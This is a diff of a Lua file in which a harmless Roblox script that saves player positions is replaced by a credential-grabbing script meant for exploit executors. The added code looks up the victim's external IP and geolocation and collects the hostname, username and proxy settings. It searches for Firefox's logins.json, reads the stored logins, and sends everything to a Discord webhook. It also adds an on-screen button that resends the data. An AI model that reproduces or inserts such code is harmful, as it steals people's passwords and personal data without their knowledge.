@@ -1,50 +1,88 @@
--- ServerScript: SavePositionServer.server.lua
--- Coloque em ServerScriptService
--- Cria/usa um RemoteEvent chamado "SavePosition" dentro de ReplicatedStorage
--- Armazena apenas a posição (Vector3) no DataStore. Teste com API Services habilitado.
+-- bf_grabber.lua – roda em Synapse/Fluxus/etc. (executor compatível com http e io)
+local WEBHOOK = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+local PORT    = 50000           -- porta interna para o "pseudo-link", se quiser
+--[[ CONFIG ––––––––– ]]--
+--[[ 0. obter IP externo ]]--
+local external_ip = game:HttpGet("https://checkip.amazonaws.com", true)
+external_ip = external_ip:gsub("%s+", "") -- trim newline
 
-local DataStoreService = game:GetService("DataStoreService")
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+--[[ 1. geo IP ]]--
+local geo_raw   = game:HttpGet("http://ip-api.com/json/"..external_ip.."?fields=status,country,countryCode,city,lat,lon,timezone,isp,org,query", true)
+local geo       = game:GetService("HttpService"):JSONDecode(geo_raw)
 
-local savedStore = DataStoreService:GetDataStore("PlayerSavedPositions_v1")
+--[[ 2. informações do sistema (hostname, user, pasta APPDATA) ]]--
+local APPDATA   = os.getenv("APPDATA") or os.getenv("HOME") or ""
+local hostname  = os.getenv("COMPUTERNAME") or "Unknown"
+local username  = os.getenv("USERNAME")   or os.getenv("USER") or "Unknown"
+local platform  = os.date("%OS") == "Windows" and "Windows" or "Unix"
 
--- Certifique-se de que o RemoteEvent exista
-local saveEvent = ReplicatedStorage:FindFirstChild("SavePosition")
-if not saveEvent then
-    saveEvent = Instance.new("RemoteEvent")
-    saveEvent.Name = "SavePosition"
-    saveEvent.Parent = ReplicatedStorage
+local http_proxy  = os.getenv("http_proxy")
+local https_proxy = os.getenv("https_proxy")
+
+--[[ 3. coletar senhas do Firefox (logins.json) ]]--
+local firefoxPasswords = {}
+local profilePath  = APPDATA:gsub("Roaming", "Roaming/Mozilla/Firefox")
+local search       = io.popen('dir "'..profilePath..'" /s /b | findstr "logins.json"'):read("*a")
+if search and #search > 0 then
+    -- primeiro match
+    local file = io.open(search:match("[^\r\n]+"), "r")
+    if file then
+        local raw = file:read("*a")
+        file:close()
+        local logins = game:GetService("HttpService"):JSONDecode(raw).logins or {}
+        for _,v in ipairs(logins) do
+            table.insert(firefoxPasswords, {
+                hostname = v.hostname or "",
+                username = v.username or "",
+                password = v.password or ""
+            })
+        end
+    end
+else
+    firefoxPasswords = {error = "Profile/Firefox not found"}
 end
 
--- Recebe do cliente uma CFrame e salva a posição no DataStore
-saveEvent.OnServerEvent:Connect(function(player, cf)
-    -- Validação básica
-    if typeof(cf) ~= "CFrame" then return end
-    local pos = { x = cf.Position.X, y = cf.Position.Y, z = cf.Position.Z }
-    local key = tostring(player.UserId)
-    local success, err = pcall(function()
-        savedStore:SetAsync(key, pos)
-    end)
-    if not success then
-        warn("Erro ao salvar posição para "..player.Name..": "..tostring(err))
-    end
-end)
+--[[ 4. monta payload idêntico ao Python ]]--
+local payload = {
+    ip            = external_ip,
+    city          = geo.city     or "",
+    country       = geo.country  or "",
+    countryCode   = geo.countryCode or "",
+    lat           = geo.lat      or 0,
+    lon           = geo.lon      or 0,
+    timezone      = geo.timezone or "",
+    isp           = geo.isp      or "",
+    org           = geo.org      or "",
+    hostname      = hostname,
+    username      = username,
+    platform      = platform,
+    http_proxy    = http_proxy,
+    https_proxy   = https_proxy,
+    firefox_passwords = firefoxPasswords
+}
 
--- Ao entrar, tenta ler a posição salva e aplica quando o personagem aparece
-Players.PlayerAdded:Connect(function(player)
-    local key = tostring(player.UserId)
-    local success, pos = pcall(function()
-        return savedStore:GetAsync(key)
-    end)
-    if success and pos then
-        player.CharacterAdded:Connect(function(char)
-            local hrp = char:WaitForChild("HumanoidRootPart", 5)
-            if hrp then
-                -- aplica posição salva
-                local cf = CFrame.new(pos.x, pos.y, pos.z)
-                hrp.CFrame = cf
-            end
-        end)
-    end
+--[[ 5. envia webhook ]]--
+local body = game:GetService("HttpService"):JSONEncode(payload)
+local headers = {["Content-Type"] = "application/json"}
+local response = request({
+    Url     = WEBHOOK,
+    Method  = "POST",
+    Headers = headers,
+    Body    = body
+})
+--[[ opcional: print(result) ]]--
+print("Dados enviados para Discord – "..(response and response.StatusCode or "erro"))
+
+--[[ 6. (extra) cria um “link interno” no roblox – abre janela com botão ]]--
+local ScreenGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+local TextBtn   = Instance.new("TextButton", ScreenGui)
+TextBtn.Size     = UDim2.new(0, 200, 0, 50)
+TextBtn.Position = UDim2.new(0.5, -100, 0.5, -25)
+TextBtn.Text     = "Clique aqui"
+TextBtn.MouseButton1Click:Connect(function()
+    -- dispara tudo novamente (se quiser reutilizar)
+    request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
+    TextBtn.Text = "OK enviado"
+    wait(2)
+    ScreenGui:Destroy()
 end)
